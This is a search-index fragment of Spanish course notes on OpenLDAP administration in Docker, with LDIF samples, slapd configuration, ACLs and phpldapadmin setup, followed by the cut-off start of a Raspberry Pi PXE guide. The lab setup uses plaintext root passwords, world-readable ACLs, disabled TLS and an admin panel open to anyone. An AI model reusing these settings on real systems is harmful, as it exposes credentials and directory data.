root tendremos que cambiarlo al usuario original al acabar los cambios. dn distingished name nom=pep,ou=usuaris,dn=edt,dc=org","title":"Estructura"},{"location":"administracion/ldap/ldap/#ficheros-datos","text":".ldif es la extensi\u00f3n de los datos de ldap con estos ficheros cargaremos y modificaremos los datos. organitzacio_edt.org contiene 4 entidades con diferentes atributos, ser\u00eda un ejemplo de estructura. dn: dc = edt,dc = org dc: edt description: Escola del treball de Barcelona objectClass: dcObject objectClass: organization o: edt.org dn: ou = maquines,dc = edt,dc = org ou: maquines description: Container per a maquines linux objectclass: organizationalunit dn: ou = clients,dc = edt,dc = org ou: clients description: Container per a clients linux objectclass: organizationalunit dn: ou = productes,dc = edt,dc = org ou: productes description: Container per a productes linux objectclass: organizationalunit dn: ou = usuaris,dc = edt,dc = org ou: usuaris description: Container per usuaris del sistema linux objectclass: organizationalunit usuaris_edt.org En este ejemplo se ve los datos para introducir varios usuarios, no todos los atributos son necesarios los obligatorios para un usuario posixAccount son: sn, cn, uid, uidNumber, gidNumber, homeDirectory dn: cn = Pau Pou,ou = usuaris,dc = edt,dc = org objectclass: posixAccount objectclass: inetOrgPerson cn: Pau Pou cn: Pauet Pou sn: Pou homephone: 555 -222-2220 mail: pau@edt.org description: Watch out for this guy ou: Profes uid: pau uidNumber: 5000 gidNumber: 100 homeDirectory: /tmp/home/pau userPassword: { SSHA } NDkipesNQqTFDgGJfyraLz/csZAIlk2/ dn: cn = Pere Pou,ou = usuaris,dc = edt,dc = org objectclass: posixAccount objectclass: inetOrgPerson cn: Pere Pou sn: Pou homephone: 555 -222-2221 mail: pere@edt.org description: Watch out for this guy ou: Profes uid: pere uidNumber: 5001 gidNumber: 100 homeDirectory: /tmp/home/pere userPassword: { SSHA } ghmtRL11YtXoUhIP7z6f7nb8RCNadFe+","title":"Ficheros datos"},{"location":"administracion/ldap/ldap/#ficheros-de-configuracion","text":"podemos modificar los datos de configuraci\u00f3n de diferentes maneras, desde bajo nivel con los ficheros que empiezan con s como slapd.conf o de forma de alto nivel desde comandos como ldapadd slapf-edt.org.conf Es el fichero de configuraci\u00f3n del demonio donde incluye los diferentes schemas de ldap, configuraci\u00f3n de la base de datos, control de acceso, etc... configuraci\u00f3n de la base de datos: ... database mdb suffix \"dc=edt,dc=org\" rootdn \"cn=Manager,dc=edt,dc=org\" rootpw secret directory /var/lib/ldap ... database es el tipo de base de datos que queremos suffix el nombre de la base de datos rootdn/rootpw Usuario con privilegios virtual ( administrador ) .... # ACL for this database access to * by self write by * read ... permisos de acceso a la base de datos.","title":"Ficheros de configuraci\u00f3n"},{"location":"administracion/ldap/ldap/#pasos-de-instalacion-en-docker","text":"docker run --name ldapserver -it --hostname ldapserver fedora:27 /bin/bash Ya dentro del contenedor dnf update vi dnf install -y vim procps iputils iproute tree nmap mlocate man dnf install -y openldap-clients openldap-servers esto crea un directorio /var/lib/ldap con el usuario ldap y siempre a de ser as\u00ed tambi\u00e9n crea /etc/openldap/slapd.d donde esta la configuraci\u00f3n en formato .ldapd","title":"Pasos de instalaci\u00f3n en docker"},{"location":"administracion/ldap/ldap/#generar-la-base-de-datos","text":"Borraremos toda la configuraci\u00f3n por defecto y crearemos la que deseamos desde el archivo slapd.conf y DB_CONFIG , estos dos archivos son los necesarios para generar la configuraci\u00f3n de los datos. slaptest genera la configuraci\u00f3n inicial en /etc/openldap/slapd.d/ desde el fichero slapd.conf copiamos dentro del contenedor los archivos que necesitaremos. mkdir /opt/docker # desde el host al contenedor docker cp slapd-edt.org.conf ldapserver:/opt/docker docker cp DB_CONFIG ldapserver:/opt/docker docker cp usuaris_edt.org.ldif ldapserver:/opt/docker docker cp organitzacio_edt.org.ldif ldapserver:/opt/docker","title":"Generar la base de datos"},{"location":"administracion/ldap/ldap/#borrar-contenido-por-defecto","text":"rm -rf /var/lib/ldap/* rm -rf /etc/openldap/slapd.d/*","title":"Borrar contenido por defecto"},{"location":"administracion/ldap/ldap/#generar-base-de-datos","text":"cp DB_CONFIG /var/lib/ldap/ slaptest -f slapd-edt.org.conf # valida el archivo de configuracion slaptest -f slapd-edt.org.conf -u slaptest -f slapd-edt.org.conf -F /etc/openldap/slapd.d/ slaptest -f slapd-edt.org.conf -F /etc/openldap/slapd.d/ -u En este momento se a creado la base de datos pero nada m\u00e1s, aun no contiene datos. Comprobar con slapcat o slapcat -n0 la configuraci\u00f3n del servidor. DB_CONFIG es un archivo binario que ayuda a la base de datos a ser mas optima en el rendimiento","title":"Generar base de datos"},{"location":"administracion/ldap/ldap/#generar-estructura","text":"El siguiente paso ser\u00eda el populate (cargar los datos ) . Cargar los datos de forma cliente mediante las ordenes ldapadd con el protocolo ldap o cargar entradas masivas en forma de servidor con slapadd . De marera masiva, desde el servidor ( el servicio tiene que estar apagado ). # cargo estructura slapadd -F /etc/openldap/slapd.d/ -l organitzacio_edt.org.ldif # # se podrian cargar tambi\u00e9n nlos usuarios en este paso pero lo dejamos para ver las 2 maneras. # compruebo estructura slapcat chown -R ldap:ldap /etc/openldap/slapd.d/ chown -R ldap:ldap /var/lib/ldap/ Al generar datos de esta manera los archivos cambian de usuario y grupo, por lo tanto les devolvemos sus usuario y grupo originales ldap:ldap","title":"Generar estructura"},{"location":"administracion/ldap/ldap/#arrancar-servicio","text":"/sbin/slapd ldap funciona en el puerto 389/tcp , as\u00ed que mapeando ese puerto podemos ver si esta activo. Comprobar ldapsearch -x -LLL -b 'dc=edt,dc=org' ldapsearch -x -LLL -b 'dc=edt,dc=org' dn ldapsearch -x -LLL -b 'dc=edt,dc=org' description ldapsearch -x -LLL -b 'dc=edt,dc=org' + ldapsearch -x -LLL -b 'dc=edt,dc=org' -h 172 .17.0.2 -LLL formato ldif -b base search -x evitar identificaci\u00f3n avanzada -h host","title":"Arrancar servicio"},{"location":"administracion/ldap/ldap/#cliente-ldap","text":"El cliente ldap tiene que indicar que servidor tiene que consultar, por lo tanto se lo indicamos en el archivo de configuraci\u00f3n del cliente /etc/openldap/ldap.conf ... URI ldap://ldapserver BASE dc = edt,dc = org comprobar que funciona ldapwhoami -x -h 172 .17.0.2 ldapwhoami -x -h 172 .17.0.2 -D 'cn=Manager,dc=edt,dc=org' -w secret","title":"Cliente ldap"},{"location":"administracion/ldap/ldap/#insertar-datos-desde-cliente","text":"ldapadd -x -h 172 .17.0.2 -f usuaris_edt.org.ldif -D 'cn=Manager,dc=edt,dc=org' -w secret ldapadd -x -h 172 .17.0.2 -f usuaris_edt.org.ldif -D 'cn=Manager,dc=edt,dc=org' -W","title":"Insertar datos desde cliente"},{"location":"administracion/ldap/ldap/#generar-imagen-docker","text":"Todo esto se a creado dentro de un contenedor de docker, pasaremos ese contenedor a imagen para futuros usos. docker commit ldapserver jorgepastorr/ldapserver19","title":"Generar imagen docker"},{"location":"administracion/ldap/ldap/#arrancar-de-nuevo","text":"En este caso ya no queremos un contenedor interactivo por lo tanto le indicaremos un -d docker run --rm -d jorgepastorr/ldapserver19 /sbin/slapd -d0 -d0 argumento de slapd para que quede en forgraund -d detach demonios del sistema se ejecutan en background los demonios de container se ejecutan en forgraund.","title":"Arrancar de nuevo"},{"location":"administracion/ldap/ldap/#dockerfile","text":"# ldapserver FROM fedora:27 LABEL version = \"1.0\" LABEL author = \"@jorgepastorr\" RUN dnf -y install openldap-servers openldap-clients RUN mkdir /opt/docker COPY * /opt/docker/ RUN chmod +x /opt/docker/startup.sh CMD /opt/docker/startup.sh install.sh #!/bin/bash # install ldapserver rm -rf /etc/openldap/slapd.d/* rm -rf /var/lib/ldap/* cp /opt/docker/DB_CONFIG /var/lib/ldap/. slaptest -f /opt/docker/slapd-edt.org.conf -F /etc/openldap/slapd.d/ slapadd -F /etc/openldap/slapd.d -l /opt/docker/organitzacio_edt.org.ldif slapadd -F /etc/openldap/slapd.d -l /opt/docker/usuaris_edt.org.ldif chown -R ldap:ldap /etc/openldap/slapd.d chown -R ldap:ldap /var/lib/ldap cp /opt/docker/ldap.conf /etc/openldap/. startup.sh #!/bin/bash bash /opt/docker/install.sh /sbin/slapd -d0 Importante: Si tenemos que arrancar el contenedor en m\u00e1quinas limitadas como amazon es posible tener que a\u00f1adir unlimit -n 1024 antes de la linea de arrancar el servicio ldapd.","title":"Dockerfile"},{"location":"administracion/ldap/ldap/#generar-imagen-con-dockerfile","text":"Estando en el directorio donde se encuentra el Dockerfile . \u251c\u2500\u2500 DB_CONFIG \u251c\u2500\u2500 Dockerfile \u251c\u2500\u2500 install.sh \u251c\u2500\u2500 ldap.conf \u251c\u2500\u2500 organitzacio_edt.org.ldif \u251c\u2500\u2500 slapd-edt.org.conf \u251c\u2500\u2500 startup.sh \u2514\u2500\u2500 usuaris_edt.org.ldif Es importante que este directorio no sea muy pesado ya que al crear la imagen copiara todo su contenido. # generar imagen docker build -t ldapserver:base . # arrancar contenedor docker run --rm -d --name ldapserver -h ldapserver -p 389 :389 ldapserver:base","title":"Generar imagen con Dockerfile"},{"location":"administracion/ldap/ldap/#el-profe-quieredice","text":"Siempre que tengamos que copiar archivos dentro de una imagen hacerlo en /opt/docker La instalaci\u00f3n b\u00e1sica la har\u00e1 el Dockerfile y la configuraci\u00f3n el archivo install.sh que lo ejecutara startup.sh que como ultima opci\u00f3n siempre tendr\u00e1 un servicio en foregraund. El entrypoint de la linea de comandos tiene mas poder que el del dockerfile, si no ponemos ninguno ejecutara el del dockerfile, si pongo un entrypoint en el docker run este anulara el del Dockerfile y lo remplazara. -p local:container -p389:389 docker history ldapserver19:base","title":"El profe quiere/dice"},{"location":"administracion/ldap/ldap/#cliente-filtrar-modificar-anadir-eliminar","text":"","title":"Cliente filtrar, modificar, a\u00f1adir, eliminar."},{"location":"administracion/ldap/ldap/#busquedas","text":"ldapsearch -x -LLL -h 172 .17.0.2 -b 'dc=edt,dc=org' '(|(cn=* Mas)(cn=* Pou))' dn ldapsearch -x -LLL -b 'dc=edt,dc=org' '(&(cn=* Mas)(ou=Profes))' dn ldapsearch -x -LLL -b 'dc=edt,dc=org' '(&(|(cn=* Mas)(cn=* Pou))(gidNumber=600))' ldapsearch -x -LLL -b 'ou=usuaris,dc=edt,dc=org' 'uidNumber>=5000' dn uidNumber ldapsearch -x -LLL -b 'dc=edt,dc=org' -s sub ldapsearch -x -LLL -b 'dc=edt,dc=org' -s base ldapsearch -x -LLL -b 'dc=edt,dc=org' -s one ldapsearch -x -LLL -b 'dc=edt,dc=org' -s children ldapsearch -x -LLL -b 'dc=edt,dc=org' + # atributos operacionales, lenguaje ldap -s sub es la salida est\u00e1ndar -s base es el primer nivel del \u00e1rbol de la base de datos -s one es el segundo nivel ( los grupos ) -s children del segundo nivel incluido hasta el ultimo ( grupos y usuarios )","title":"B\u00fasquedas"},{"location":"administracion/ldap/ldap/#anadir","text":"ldapadd -x -D cn = Manager,dc = edt,dc = org -w secret -f /tmp/ldap/usuario_nuevo.ldif La opci\u00f3n -c permite en el caso de a\u00f1adir un elemento y falle pase al siguiente y no pare todo el proceso. usuario_nuevo.ldif dn: cn = Pau Maria Pou,ou = usuaris,dc = edt,dc = org objectClass: posixAccount objectClass: inetOrgPerson cn: Pau Maria Pou sn: Pou ou: Profes uid: pau uidNumber: 5000 gidNumber: 100 homeDirectory: /tmp/home/pau userPassword:: e1NTSEF9TkRraXBlc05RcVRGRGdHSmZ5cmFMei9jc1pBSWxrMi8 = mail: modme@example.com homePhone: 111 -222-333 description: nueva descripcion para Pau Pou","title":"A\u00f1adir"},{"location":"administracion/ldap/ldap/#eliminar","text":"ldapdelete -x -D cn = Manager,dc = edt,dc = org -w secret 'cn=Pau Pou,ou=usuaris,dc=edt,dc=org' ldapdelete -x -D cn = Manager,dc = edt,dc = org -w secret -f modificaciones.ldif","title":"Eliminar"},{"location":"administracion/ldap/ldap/#modificar","text":"ldapmodify -x -D cn = Manager,dc = edt,dc = org -w secret -f modificaciones.ldif changetype: <[modify|add|delete|modrdn]>","title":"Modificar"},{"location":"administracion/ldap/ldap/#modify","text":"modificaciones.ldif dn: cn = Pau Pou,ou = usuaris,dc = edt,dc = org changetype: modify replace: mail mail: modme@example.com - replace: homePhone homephone:111-222-333 - delete: description dn: cn = Anna Pou,ou = usuaris,dc = edt,dc = org changetype: modify add: description description: nueva descripcion para Anna Pou borrar todos los cn repetidos y dejar solo 1 dn: cn = Anna Pou,ou = usuaris,dc = edt,dc = org changetype: modify replace: cn cn: Anna Pou modificaciones.ldif dn: cn = Anna Pou,ou = usuaris,dc = edt,dc = org changetype: delete ldapdelete -x -r -D cn = Manager,dc = edt,dc = org -w secret \"ou=usuaris,dc=edt,dc=org\" Ojo opci\u00f3n -r recursivo que borra toda su descendencia","title":"Modify"},{"location":"administracion/ldap/ldap/#add","text":"modificaciones.ldif dn: cn = Anna Pou,ou = usuaris,dc = edt,dc = org changetype: add objectClass: posixAccount objectClass: inetOrgPerson cn: Anna Pou cn: Anita Pou sn: Pou mail: anna@edt.org ou: Alumnes uid: anna uidNumber: 5002 gidNumber: 600 homeDirectory: /tmp/home/anna userPassword:: e1NTSEF9Qm00QjNCdS9mdUg2QmJ5OWxneGZGQXdMWXJLMFJiT3E = description: modified description homePhone: 93 -222-333","title":"Add"},{"location":"administracion/ldap/ldap/#modrdn","text":"modificaciones.ldif dn: cn = Pau Pou,ou = usuaris,dc = edt,dc = org changetype: modrdn newrdn: cn = Pau Maria Pou deleteoldrdn: 0 deleteoldrdn 0 | 1 se refiere a si quieres remplazar el ultimo registro de cn o solo a\u00f1adir uno nuevo. dn: cn = Anna Woman,ou = usuaris,dc = edt,dc = org changetype: modrdn newrdn: cn = Anna Elder deleteoldrdn: 1 newsuperior: ou = consumidors,dc = edt,dc = org newsuperior modificar ruta del usuario Modificar desde linea de comando. ldapmodrdn -x -D cn = Manager,dc = edt,dc = org -w secret 'cn=Anna Puig,ou=usuaris,dc=edt,dc=org' 'cn=Annita Puig'","title":"Modrdn"},{"location":"administracion/ldap/ldap/#ldapcompare","text":"ldapcompare sirve para verificar datos en scripts, muestra cierto en el caso que el dato sea correcto. ldapcompare -x -h 172 .17.0.2 'cn=Anna pou,ou=usuaris,dc=edt,dc=org' mail:anna@edt.org TRUE","title":"Ldapcompare"},{"location":"administracion/ldap/ldap/#getent","text":"permite validar obtener la informaci\u00f3n de los usuarios del sistema independientemente de donde vengan. getent passwd <usuario> getent group <grupo> ldapurl -h 172 .17.0.2 -b dc = edt,dc = org -s sub ldapurl -H ldap://172.17.0.2:389/dc = edt,dc = org?dn,mail?sub? ( cn = Pau Pou )","title":"getent"},{"location":"administracion/ldap/ldap/#password","text":"Cliente ldappasswd -x -h 172 .17.0.2 -D 'cn=user10,ou=usuaris,dc=edt,dc=org' -w jupiter -s user10 -w antiguo pasword -s nuevo pasword Servidor generar contrase\u00f1as para a\u00f1adir al archivo de usuarios. slappasswd -h { SSHA } | { CRYPT } | { md5 } New password: Re-enter new password: jupiter { SHA } ovf8ta/reYP/u2zj0afpHt8yE1A = por defecto ya la genera {SHA} no hace falta la opci\u00f3n -h","title":"Password"},{"location":"administracion/ldap/ldap/#multiples-bases-de-datos","text":"slapd.conf ... # ---------------------------------------------------------------------- database mdb suffix \"dc=edt,dc=org\" rootdn \"cn=Manager,dc=edt,dc=org\" rootpw secret directory /var/lib/ldap.edt.org index objectClass eq,pres access to * by self write by * read # ---------------------------------------------------------------------- database mdb suffix \"dc=m06,dc=cat\" rootdn \"cn=Root,dc=m06,dc=cat\" rootpw jupiter directory /var/lib/ldap.m06.cat index objectClass eq,pres access to * by self write by * read # -------------------------------------------------------- database config rootdn \"cn=Sysadmin,cn=config\" rootpw { SSHA } 5DfZc1WXeIwrP7C3fr23WLZiPZ5YHMgA # enable monitoring database monitor la instalaci\u00f3n cambia un poco a la original, cada base de datos tendr\u00e1 su propio directorio. rm -rf /etc/openldap/slapd.d/* rm -rf /var/lib/ldap/* mkdir /var/lib/ldap.m06.cat mkdir /var/lib/ldap.edt.org cp /opt/docker/DB_CONFIG /var/lib/ldap.m06.cat/. cp /opt/docker/DB_CONFIG /var/lib/ldap.edt.org/. slaptest -f /opt/docker/slapd.conf -F /etc/openldap/slapd.d/ slapadd -F /etc/openldap/slapd.d -l /opt/docker/edt.org.ldif # especifico en que base de datos inyectar los elementos con -b slapadd -b 'dc=m06,dc=cat' -F /etc/openldap/slapd.d -l /opt/docker/m06.cat.ldif chown -R ldap:ldap /etc/openldap/slapd.d chown -R ldap:ldap /var/lib/ldap chown -R ldap:ldap /var/lib/ldap.m06.cat chown -R ldap:ldap /var/lib/ldap.edt.org cp /opt/docker/ldap.conf /etc/openldap/. /etc/openldap/slap.d config /var/lib/ldab.edt.org /var/lib/ldab.m06.cat /var/lib/ldap slapcat > back.ldap.dump","title":"M\u00faltiples bases de datos"},{"location":"administracion/ldap/ldap/#backup","text":"backup del directorio de de configuracion y de datos o con slapcat un fichero ldif","title":"Backup"},{"location":"administracion/ldap/ldap/#acl","text":"Las acl son los permisos que tendr\u00e1 cada usuario respecto a las bases de datos La base de datos config se crea por defecto, pero si no la especificas en el archivo slapd.conf el nombre y la contrase\u00f1a de rootdn y rootpw ser\u00e1n aleatorios, y no podr\u00e1s configurar los permisos. database config rootdn \"cn=Sysadmin,cn=config\" rootpw { SSHA } 8a7gp+odUWaevnLbf+9eJK9y3lTbMonq ldapmodify -x -D 'cn=Sysadmin,cn=config' -w syskey -f acl.ldif","title":"Acl"},{"location":"administracion/ldap/ldap/#a-tener-en-cuenta","text":"Por defecto si no se especifica ninguna acl esta es access to * by * read En cuanto a\u00f1ades cualquier acl por defecto se implementara en ultimo lugar access to * by * none El usuario especificado como rootdn no le afectar\u00e1n en ning\u00fan caso las reglas de acl El usuario anonymous en ning\u00fan caso podr\u00e1 modificar alg\u00fan dato. Primero se implementaran las reglas de la base de datos y seguidamente las globales La posici\u00f3n de las reglas ir\u00e1n de mas restrictivas a menos. Sintaxis de la implantaci\u00f3n de reglas access to <what> [ by <who> [ <access> ] [ <control> ] ] + <level> :: = none | disclose | auth | compare | search | read | { write | add | delete } | manage what se refiere a que atributo afecta. who quien esta afectado, usuario, grupo, etc... access tipo de acceso que se va a tener Cuando coinciden dos o mas what solo se implementar\u00e1 el primero. # sintaxis erronea access to attrs = homePhone by dn.exact = \u201dcn = Anna Pou,ou = usuaris,dc = edt,dc = org\u201d write access to attrs = homePhone by dn.exact = \u201dcn = Admin System,ou = usuaris,dc = edt,dc = org\u201d write access to attrs = homePhone by * read # sintaxis correcta access to attrs = homePhone by dn.exact = \u201dcn = Anna Pou,ou = usuaris,dc = edt,dc = org\u201d write by dn.exact = \u201dcn = Admin System,ou = usuaris,dc = edt,dc = org\u201d write by * read Ojo con el atributo userPassword access to attrs = userPassword by self write by * auth [ by * none ] access to * by * read Ejemplo de modificaci\u00f3n. dn: olcDatabase ={ 1 } mdb,cn = config changetype: modify replace: olcAccess olcAccess: to attrs = homePhone by * read olcAccess: to * by * write","title":"A tener en cuenta"},{"location":"administracion/ldap/ldap/#slapacl","text":"Es una manera de ver los permisos rapidamente para una acci\u00f3n # permisos generales de usuario slapacl -b 'cn=Marta Mas,ou=usuaris,dc=edt,dc=org' entry: read (= rscxd ) children: read (= rscxd ) .... # marta mas puede leer su pasword? slapacl -b 'cn=Marta Mas,ou=usuaris,dc=edt,dc=org' -D 'cn=Marta Mas,ou=usuaris,dc=edt,dc=org' userpassword/read read access to userPassword: ALLOWED","title":"slapacl"},{"location":"administracion/ldap/ldap/#schemas","text":"/etc/openldap/schema En los elementos de la base de datos se le a\u00f1aden objetos y atributos que est\u00e1n definidos en los archivos schema , estos atributos son los que nos ayudan a cargar los datos. Por defecto ya vienen predefinidos los objetos necesarios para su correcto funcionamiento, pero si queremos objetos adicionales se tienen que crear manualmente.","title":"Schemas"},{"location":"administracion/ldap/ldap/#tipos-de-objeto","text":"Toda entidad tiene que tener un objeto structural, ademas puede tener mas objetos auxiliares. Structural : Es el objeto principal por el que se identificara a ese elemento, por ejemplo una persona. nombre, id, apellido. Auxiliary : Es un objeto que aporta informaci\u00f3n extra al structural, por ejemplo datos de gimnasio. foto, vestuario, clases.","title":"Tipos de objeto"},{"location":"administracion/ldap/ldap/#descendencia","text":"Los objetos pueden descender de TOP o de otro objeto. El caso es que si desciende de TOP y es un objeto structural se tiene que a\u00f1adir un atributo para identificar el futuro elemento, en el caso de ser auxiliar no hay ning\u00fan problema. Si un objeto desciende de otro objeto, este heredar\u00e1 los atributos del objeto superior.","title":"Descendencia"},{"location":"administracion/ldap/ldap/#identificadores","text":"OID (sistema de implantaci\u00f3n de n\u00fameros \u00fanicos) Identificadores \u00fanicos para tipo de caracteres. Name OID Description boolean 1.3.6.1.4.1.1466.115.121.1.7 boolean value directoryString 1.3.6.1.4.1.1466.115.121.1.15 Unicode (UTF-8) string distinguishedName 1.3.6.1.4.1.1466.115.121.1.12 LDAP DN integer 1.3.6.1.4.1.1466.115.121.1.27 integer numericString 1.3.6.1.4.1.1466.115.121.1.36 numeric string OID 1.3.6.1.4.1.1466.115.121.1.38 object identifier octetString 1.3.6.1.4.1.1466.115.121.1.40 arbitrary octets Identificadores \u00fanicos para tipo de objetos, atributos, elementos. OID Assignment 1.1 Organization's OID 1.1.1 SNMP Elements 1.1.2 LDAP Elements 1.1.2.1 AttributeTypes 1.1.2.1.1 x-my-Attribute 1.1.2.2 ObjectClasses 1.1.2.2.1 x-my-ObjectClass importante : En una base de datos ldap un identificador \u00fanico en un objeto, atributo, etc... no se pueden repetir, por lo tanto si creo un atributo su id ser\u00e1 1.1.2.1.1 y el siguiente 1.1.2.1.2 y as\u00ed consecutivamente.","title":"Identificadores"},{"location":"administracion/ldap/ldap/#objetos","text":"diferentes combinaciones del mismo objeto. objectclass ( 1.1.2.2.1 NAME 'x-futbolistes' DESC 'futboleros' SUP TOP AUXILIARY MUST x-equip MAY ( x-dorsal $ x-web $ x-foto $ x-lesionat )) objectclass ( 1.1.2.2.1 NAME 'x-futbolistes' DESC 'futboleros' SUP TOP STRUCTURAL MUST ( lonom $ x-equip ) MAY ( x-dorsal $ x-web $ x-foto $ x-lesionat )) objectclass ( 1.1.2.2.1 NAME 'x-futbolistes' DESC 'futboleros' SUP inetOrgPerson STRUCTURAL MUST x-equip MAY ( x-dorsal $ x-web $ x-foto $ x-lesionat )) DESC : descripcion SUP : descendencia, de donde desciende. ESTRUCTURAL/AUXILIARY : tipo de objeto MUST : Atributos obligatorio del objeto MAY : atributos opcionales","title":"Objetos"},{"location":"administracion/ldap/ldap/#atributos","text":"attributetype ( 1.1.2.1.1 NAME 'x-equip' DESC 'EQUIP DEL FUTBOLISTA' EQUALITY caseIgnoreMatch SUBSTR caseIgnoreSubstringsMatch SYNTAX 1.3.6.1.4.1.1466.115.121.1.15 SINGLE-VALUE) DESC : descripci\u00f3n EQUALITY : para restringir si es igual o no un nombre SUBSTR : para restringir la b\u00fasqueda SYNTAX : tipo de atributo SINGLE-VALUE : valor \u00fanico, no se puede repetir.","title":"Atributos"},{"location":"administracion/ldap/ldap/#ejemplo-schema","text":"attributetype ( 1.1 . 2.1 . 1 NAME 'x-equip ' DESC 'EQUIP DEL FUTBOLISTA ' EQUALITY caseIgnoreMatch SUBSTR caseIgnoreSubstringsMatch SYNTAX 1.3 . 6.1 . 4.1 . 1466.115 . 121.1 . 15 SINGLE-VALUE ) attributetype ( 1.1 . 2.1 . 2 NAME 'x-dorsal ' DESC 'dorsal de futbolista ' SYNTAX 1.3 . 6.1 . 4.1 . 1466.115 . 121.1 . 27 SINGLE-VALUE ) attributetype ( 1.1 . 2.1 . 3 NAME 'x-web ' DESC 'pagina web del futbolista ' EQUALITY caseIgnoreMatch SYNTAX 1.3 . 6.1 . 4.1 . 1466.115 . 121.1 . 15 ) attributetype ( 1.1 . 2.1 . 4 NAME 'x-foto ' DESC 'foto del futbolista ' SYNTAX 1.3 . 6.1 . 4.1 . 1466.115 . 121.1 . 40 ) attributetype ( 1.1 . 2.1 . 5 NAME 'x-lesionat ' DESC 'futbolista lesionat ' SYNTAX 1.3 . 6.1 . 4.1 . 1466.115 . 121.1 . 7 SINGLE-VALUE ) objectclass ( 1.1 . 2.2 . 1 NAME 'x-futbolistes ' DESC 'futboleros ' SUP TOP AUXILIARY MUST x-equip MAY ( x-dorsal $ x-web $ x-foto $ x-lesionat ))","title":"Ejemplo schema"},{"location":"administracion/ldap/ldap/#gestores-graficos","text":"Existen diferentes gestores gr\u00e1ficos para modificar, a\u00f1adir, eliminar contenido en el servidor ldap. Estos son gq y phpldapadmin , los dos realizan las mismas funciones. GQ es mas simple de instalar pero menos fiable dnf install gq . phpldapadmin tiene una peque\u00f1a configuraci\u00f3n y requiere un apache, pero es mas fiable.","title":"Gestores gr\u00e1ficos"},{"location":"administracion/ldap/ldap/#phpldapadmin","text":"instalaci\u00f3n dnf install phpldapadmin php-xml httpd systemctl start httpd configuraci\u00f3n con ldap # vim /etc/phpldapadmin/config.php $servers ->newServer ( 'ldap_pla' ) ; $servers ->setValue ( 'server' , 'name' , 'Local LDAP Server' ) ; $servers ->setValue ( 'server' , 'host' , '172.17.0.2' ) ; // ip o hostame de servidor ldap $servers ->setValue ( 'server' , 'port' ,389 ) ; $servers ->setValue ( 'server' , 'base' ,array ( 'dc=edt,dc=org' )) ; $servers ->setValue ( 'login' , 'auth_type' , 'session' ) ; $servers ->setValue ( 'server' , 'tls' ,false ) // $servers ->setValue ( 'appearance' , 'password_hash' , 'ssha' ) ; // comentada perqu\u00e8 generava un error // $servers ->setValue ( 'login' , 'attr' , 'uid' ) ; // comentada perqu\u00e8 generava un error configuraci\u00f3n para acceso remoto # vim /etc/httpd/config.d/phpldapadmin.conf Alias /phpldapadmin /usr/share/phpldapadmin/htdocs Alias /ldapadmin /usr/share/phpldapadmin/htdocs <Directory /usr/share/phpldapadmin/htdocs> <IfModule mod_authz_core.c> Require all granted </IfModule> <IfModule !mod_authz_core.c> Allow from * </IfModule> </Directory> Por defecto phpldapadmin solo acepta acceso desde localhost, con esta configuraci\u00f3n aceptara acceso remoto de cualquiera. localhost/phpldapadmin","title":"phpldapadmin"},{"location":"administracion/ldap/ldap/#docker","text":"Dockerfile # phpldapadmin FROM fedora:27 LABEL version = \"1.0\" LABEL author = \"@jorgepastorr\" RUN dnf -y install phpldapadmin php-xml httpd RUN mkdir /opt/docker COPY * /opt/docker/ RUN chmod +x /opt/docker/startup.sh WORKDIR /opt/docker CMD /opt/docker/startup.sh install.sh #!/bin/bash cp /opt/docker/phpldapadmin.conf /etc/httpd/conf.d/ cp /opt/docker/config.php /etc/phpldapadmin/ startup.sh #!/bin/bash bash /opt/docker/install.sh /sbin/php-fpm /sbin/httpd -D FOREGROUND \u279c tree . \u251c\u2500\u2500 config.php \u251c\u2500\u2500 Dockerfile \u251c\u2500\u2500 install.sh \u251c\u2500\u2500 phpldapadmin.conf \u2514\u2500\u2500 startup.sh docker build -t phpldapadmin . docker run -h phpldapadmin --name phpldapadmin -d -p 80 :80 phpldapadmin","title":"Docker"},{"location":"administracion/ldap/ldap/#configurar-cliente-ldap","text":"En todos los clientes que vallan a tener acceso al servidor ldap, tienen que tener la siguiente configuraci\u00f3n. Paquetes necesarios : authconfig nss-pam-ldapd Primero es bueno verificar que podemos conectar con el servidor, con el paquete openldap-clients . A\u00f1adimos ruta al archivo de configuraci\u00f3n: /etc/openldap/ldap.conf ... URI ldap://ldapserver BASE dc = edt,dc = org Comprobamos con ldapsearch -x -LLL dn .","title":"Configurar cliente ldap"},{"location":"administracion/ldap/ldap/#configuracion-de-acceso-al-servidor","text":"para el acceso a los usuarios, se necesita modificar el archivo /etc/pam.d/system-auth , pero lo aremos autom\u00e1ticamente con authconfig authconfig --enableshadow --enablelocauthorize \\ --enableldap \\ --enableldapauth \\ --ldapserver = 'ldapserver' \\ --ldapbase = 'dc=edt,dc=org' \\ --enablemkhomedir \\ --updateall El comando anterior comando a modificado los siguientes archivos y system-auth /etc/nslcd.conf ... uri ldap://ldapserver base dc = edt,dc = org ... /etc/nsswitch.conf ... passwd: files ldap systemd shadow: files ldap group: files ldap systemd ... En este momento ya tenemos ldap.conf con la b\u00fasqueda predefinida a nuestro servidor ldap, para que funcionen los comandos ldapsearch etc.. nslcd.conf para que el sistema conecte con el servidor ldap. nsswitch.conf para que el sistema mire los archivos passwd, shadow, group en el orden establecido. Comprobamos con getent passwd .","title":"Configuraci\u00f3n de acceso al servidor"},{"location":"administracion/pxe/Servidor-pxe-con-rapberry/","text":"Servidor pxe con rapberry Servidor pxe con rapberry Instalaci\u00f3n configurar dhcp Configuraci\u00f3n inet.d Configuraci\u00f3n FTP Creo men\u00fa de iniciaci\u00f3n pxe Instalar samba con windows paquetes necesarios 1-Que es PXE? Entorno de ejecuci\u00f3n de prearranque, es decir, un entorno para arrancar e instalar el sistema operativo en nodos a trav\u00e9s de la red. 2-Que hace? Permite conectarte autom\u00e1ticamente a un servidor donde puedes descargar e instalar el sistema operativo que tenga disponible el servidor. 3-Que necesita? Servidor DHCP (Red) Servidor FTP (ISOS) Men\u00fa de previsualizaci\u00f3n. 4-Como funciona? Almacena las im\u00e1genes en un servidor en el que accedes cuando te conectas por PXE mediante DHCP, y una vez conectado permite descargar e instalar dichas im\u00e1genes mediante un servidor ftp. Instalaci\u00f3n Raspberry pi 3b IP: 192.168.4.103 Mascara: 255.255.0.0 Broadcast: 192.168.255.255 Router: 192.168.0.1 Instalamos dhcp, inet utils y ftp sudo apt-get install -y isc-dhcp-server inetutils-inetd tftp tftpd-hpa configurar dhcp /etc/dhcp/dhcpd.conf default-lease-time 600 ; max-lease-time 7200 ; ddns-update-style none ; authoritative ; allow booting ; allow bootp ; subnet 192 .168.4.0 netmask 255 .255.255.0 { option broadcast-address 192 .168.4.255 ; # broadcast range 192 .168.4.100 192 